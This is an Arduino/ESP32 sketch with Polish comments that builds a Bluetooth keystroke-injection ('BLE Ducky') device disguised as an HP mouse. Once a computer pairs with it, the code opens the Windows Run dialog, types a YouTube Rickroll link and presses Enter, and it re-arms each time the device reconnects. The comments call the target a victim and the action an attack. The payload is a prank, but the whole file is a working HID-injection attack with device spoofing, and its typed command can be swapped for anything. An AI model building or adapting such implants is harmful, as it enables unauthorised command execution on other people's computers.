#include <BleKeyboard.h>

BleKeyboard bleKeyboard("Myszka_Biurko_HP", "Hewlett-Packard", 100);

// Flaga blokująca ciągłe otwieranie okien
bool prankWykonany = false; 

// NOWOŚĆ: Zmienna, która sprawdza, czy jesteśmy w trakcie trwającego połączenia
bool byloPodlaczone = false; 

void setup() {
  Serial.begin(115200);
  Serial.println("Uruchamianie narzedzia BLE Ducky...");
  bleKeyboard.begin();
}

void loop() {
  // JEŚLI JESTEŚMY POŁĄCZENI Z KOMPUTEREM
  if(bleKeyboard.isConnected()) {
    
    // Sprawdzamy, czy to jest "świeże" połączenie, które nastąpiło przed sekundą
    if(!byloPodlaczone) {
      Serial.println("Wykryto cel! Odliczam 4 sekundy, by komputer nadazyl...");
      delay(4000); // Dajemy komputerowi czas na ogarnięcie, że podłączono klawiaturę
      byloPodlaczone = true;
    }

    // Jeśli mamy połączenie i prank nie był jeszcze zrobiony -> ATAK!
    if(!prankWykonany) {
      Serial.println("Wysylam Payload!");

      // Odpalamy okno uruchom
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(150); // Lekko dłuższa pauza dla stabilności na starszych komputerach
      bleKeyboard.releaseAll();
      
      // Czekamy, aż Windows otworzy fizycznie okienko w rogu ekranu
      delay(800);

      // Wpisujemy link i klikamy Enter
      // Wpisujemy link LITERKA PO LITERCE (bezpieczne dla Bluetooth)
      // Wpisujemy MIKRO-LINK z podkręconą prędkością
      String link = "youtu.be/dQw4w9WgXcQ";
      for(int i = 0; i < link.length(); i++) {
        bleKeyboard.print(link[i]);
        delay(25); // Zmniejszamy czas z 25ms na 12ms! To granica stabilności.
      }
      
      bleKeyboard.releaseAll(); 
      delay(100); // Tutaj też ucinamy czas o połowę
      
      // Wciskamy Enter
      bleKeyboard.write(KEY_RETURN);
      bleKeyboard.releaseAll();

      // --- NOWY KROK: WYMUSZENIE ODTWARZANIA ---
      Serial.println("Czekam, az przegladarka zaladuje YouTube'a...");
      
      // Dajemy komputerowi aż 5 sekund (5000 ms) na pełne załadowanie strony. 
      // Jeśli komputer ofiary jest wolny, możesz to zwiększyć nawet do 7000.
      delay(5000); 

      // Wciskamy Enter ponownie, aby odpalić film na środku ekranu!
      bleKeyboard.write(KEY_RETURN); 
      bleKeyboard.releaseAll();
      // ------------------------------------------

      Serial.println("Atak zakonczony. Przechodze w tryb uspienia.");
      
      // Blokujemy powtarzanie, żeby nie zawiesić komputera
      prankWykonany = true;
    }
    
  } 
  // JEŚLI NIE MAMY POŁĄCZENIA (np. ofiara rozłączyła BT, albo uciekliśmy z zasięgu)
  else {
    if(byloPodlaczone) {
      Serial.println("Cel zgubiony. Przeladowuje bron...");
      
      // RESETUJEMY SYSTEM! Gdy ktoś znów się połączy, kod odpali się od nowa.
      byloPodlaczone = false;
      prankWykonany = false; 
      
      delay(1000); // Żeby procesor odpoczął
    }
  }
}